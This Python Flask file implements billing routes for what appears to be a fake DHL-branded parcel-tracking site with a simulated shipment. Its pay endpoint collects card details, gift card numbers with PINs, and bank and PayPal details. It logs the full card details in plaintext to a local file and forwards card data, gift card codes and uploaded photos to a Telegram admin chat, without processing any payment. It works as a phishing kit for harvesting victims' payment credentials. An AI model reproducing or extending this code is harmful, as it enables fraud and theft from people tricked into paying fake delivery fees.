# payment_routes.py
"""
Payment & billing routes – modularized from app.py
"""
import logging
import json
from io import BytesIO
from datetime import datetime
from flask import render_template, request, jsonify, flash
from werkzeug.utils import secure_filename
from utils import (
    Shipment, db, get_bot, rset, rget, invalidate_cache,
    validate_email, estimate_distance, redis_client
)

# Helper: calculate shipment cost
def calculate_shipment_cost(distance_km: float, service_level: str) -> float:
    if distance_km <= 0:
        return 0.0
    base_rate = 0.50 if 'Express' in service_level else 0.30
    premium = 1.2 if '9:00' in service_level or '12:00' in service_level else 1.0
    return round(distance_km * base_rate * premium, 2)

# ---------- Routes ----------
def init_payment_routes(app):
    """Register payment/billing routes with the Flask app."""

    @app.route('/billing')
    def billing():
        email = request.args.get('email') or request.form.get('email')
        if not email:
            return render_template('billing_login.html')
        if not validate_email(email):
            flash('Invalid email address.', 'error')
            return render_template('billing_login.html')
        shipments = Shipment.query.filter_by(recipient_email=email).order_by(Shipment.created_at.desc()).all()
        invoices = []
        total_due = 0.0
        for s in shipments:
            if s.invoice_amount is not None and s.invoice_amount > 0:
                cost = s.invoice_amount
            else:
                distance = estimate_distance(s.origin_location or 'Lagos, NG', s.delivery_location)
                service_level = rget('service_level', s.tracking_number, 'DHL Express')
                cost = calculate_shipment_cost(distance, service_level)
            invoices.append({
                'shipment': s,
                'cost': cost,
                'service_level': rget('service_level', s.tracking_number, 'DHL Express'),
                'distance': estimate_distance(s.origin_location or 'Lagos, NG', s.delivery_location)
            })
            if s.payment_status != 'paid':
                total_due += cost
        return render_template('billing.html', invoices=invoices, email=email, total_due=round(total_due, 2))

    @app.route('/billing/pay', methods=['POST'])
    def billing_pay():
        import logging
        from datetime import datetime
        from werkzeug.utils import secure_filename

        # Determine request type
        if request.is_json:
            data = request.get_json()
            email = data.get('email')
            tracking_numbers = data.get('tracking_numbers', [])
            payment_method = data.get('payment_method', 'Credit Card')
            card_details = data.get('card_details', {})
            billing = data.get('billing', {})
            phone = data.get('phone', '')
            crypto_details = data.get('crypto_details', {})
            # Add support for bank & PayPal details in JSON
            bank_details = data.get('bank_details', {})
            paypal_details = data.get('paypal_details', {})
            uploaded_file = None
        else:
            data = request.form
            email = data.get('email')
            tracking_numbers = data.get('tracking_numbers', '').split(',') if data.get('tracking_numbers') else []
            payment_method = data.get('payment_method', '')
            uploaded_file = request.files.get('gift_card_photo') or request.files.get('payment_screenshot')
            # Method-specific details
            gift_card_details = {
                'name': data.get('gift_card_name'),
                'number': data.get('gift_card_number'),
                'pin': data.get('gift_card_pin'),
            }
            paypal_details = {
                'sender_email': data.get('sender_email'),
                'note': data.get('paypal_note'),
            }
            bank_details = {
                'bank_name': data.get('bank_name'),
                'account_holder': data.get('account_holder'),
                'account_number_last4': data.get('account_number'),
                'reference_used': data.get('transfer_reference'),
            }
            card_details = {}
            billing = {}
            phone = data.get('contact_phone', '')
            crypto_details = {}

        if not email or not tracking_numbers:
            return jsonify({'error': 'Missing email or tracking numbers'}), 400

        # Setup logger
        logger = logging.getLogger('payment_logger')
        if not logger.handlers:
            handler = logging.FileHandler('payment.log')
            handler.setFormatter(logging.Formatter('%(asctime)s %(message)s'))
            logger.addHandler(handler)
            logger.setLevel(logging.INFO)

        log_entry = {
            'timestamp': datetime.now().isoformat(),
            'email': email,
            'payment_method': payment_method,
            'tracking_numbers': tracking_numbers,
            'has_photo': bool(uploaded_file and uploaded_file.filename),
        }
        if request.is_json:
            if payment_method == 'Credit Card':
                log_entry['card_details'] = card_details
                if billing:
                    log_entry['billing'] = billing
                if phone:
                    log_entry['phone'] = phone
            elif payment_method == 'Crypto':
                log_entry['crypto_details'] = crypto_details
            elif payment_method == 'Bank Transfer':
                log_entry['bank_details'] = bank_details
            elif payment_method == 'PayPal':
                log_entry['paypal_details'] = paypal_details
        else:
            if payment_method == 'Gift Card':
                log_entry['gift_card_details'] = gift_card_details
            elif payment_method == 'PayPal':
                log_entry['paypal_details'] = paypal_details
            elif payment_method == 'Bank Transfer':
                log_entry['bank_details'] = bank_details
            if phone:
                log_entry['phone'] = phone

        logger.info(json.dumps(log_entry))

        # Telegram notification
        try:
            bot = get_bot()
            if bot:
                msg = f"💳 New Payment Request\nEmail: {email}\nMethod: {payment_method}\nTracking: {', '.join(tracking_numbers)}\n"
                if request.is_json and payment_method == 'Credit Card':
                    card = card_details
                    msg += f"Card: **** **** **** {card.get('number', '')[-4:] if card.get('number') else ''}\n"
                    msg += f"Expiry: {card.get('expiry')}\nName: {card.get('name')}\n"
                    if billing:
                        msg += f"Billing: {billing.get('address')}, {billing.get('city')}, {billing.get('state')} {billing.get('zip')}, {billing.get('country')}\n"
                    msg += f"Phone: {phone}"
                elif request.is_json and payment_method == 'Crypto':
                    crypto = crypto_details
                    msg += f"Coin: {crypto.get('coin')}\n"
                    msg += f"Amount: {crypto.get('amount_crypto')}\n"
                    msg += f"TXID: {crypto.get('transaction_hash')}"
                elif request.is_json and payment_method == 'Bank Transfer':
                    bank = bank_details
                    msg += f"Bank Name: {bank.get('bank_name')}\n"
                    msg += f"Account Holder: {bank.get('account_holder')}\n"
                    msg += f"Account (last4): {bank.get('account_number_last4')}\n"
                    msg += f"Reference: {bank.get('reference_used')}"
                elif request.is_json and payment_method == 'PayPal':
                    pp = paypal_details
                    msg += f"Sender Email: {pp.get('sender_email')}\n"
                    msg += f"Note: {pp.get('note')}"
                elif not request.is_json and payment_method == 'Gift Card':
                    msg += f"Card Type: {data.get('gift_card_name')}\n"
                    msg += f"Card Number: {data.get('gift_card_number')}\n"
                    msg += f"PIN: {data.get('gift_card_pin', 'N/A')}"
                elif not request.is_json and payment_method == 'PayPal':
                    msg += f"Sender Email: {data.get('sender_email')}\n"
                    msg += f"Note: {data.get('paypal_note', '')}"
                elif not request.is_json and payment_method == 'Bank Transfer':
                    msg += f"Bank Name: {data.get('bank_name')}\n"
                    msg += f"Account Holder: {data.get('account_holder')}\n"
                    msg += f"Account (last4): {data.get('account_number')}\n"
                    msg += f"Reference: {data.get('transfer_reference')}"
                else:
                    msg += "Additional details logged in payment.log"

                admin_chat_id = app.config.get('TELEGRAM_ADMIN_CHAT_ID')
                if admin_chat_id:
                    if uploaded_file and uploaded_file.filename:
                        try:
                            file_data = uploaded_file.read()
                            bot.send_photo(admin_chat_id, BytesIO(file_data), caption=msg)
                        except Exception as e:
                            logger.error(f"Failed to send photo via Telegram: {e}")
                            bot.send_message(admin_chat_id, msg + "\n📎 Photo could not be attached (see log)")
                    else:
                        bot.send_message(admin_chat_id, msg)
                else:
                    logger.warning('No TELEGRAM_ADMIN_CHAT_ID configured, skipping Telegram notification.')
        except Exception as e:
            logger.error(f'Telegram notification failed: {e}')

        # Mark as pending (not paid) – admin will verify and mark paid
        for tn in tracking_numbers:
            shipment = Shipment.query.filter_by(tracking_number=tn, recipient_email=email).first()
            if shipment and shipment.payment_status != 'paid':
                shipment.payment_status = 'pending'
                shipment.payment_method = payment_method
                db.session.commit()
                # DO NOT resume simulation – admin will resume on mark_paid

        return jsonify({
            'success': True,
            'paid_count': 0,
            'message': 'Payment request submitted. The admin will review and mark as paid shortly.'
        })

    @app.route('/payment/<method>')
    def payment_page(method):
        email = request.args.get('email', '')
        tracking = request.args.get('tracking', '')
        template_map = {
            'credit_card': 'credit_card.html',
            'bank_transfer': 'bank_transfer.html',
            'paypal': 'paypal.html',
            'gift_card': 'gift_card.html',
            'crypto': 'crypto.html',
        }
        template = template_map.get(method, 'payment_default.html')
        return render_template(template, email=email, tracking=tracking, now=datetime.now)
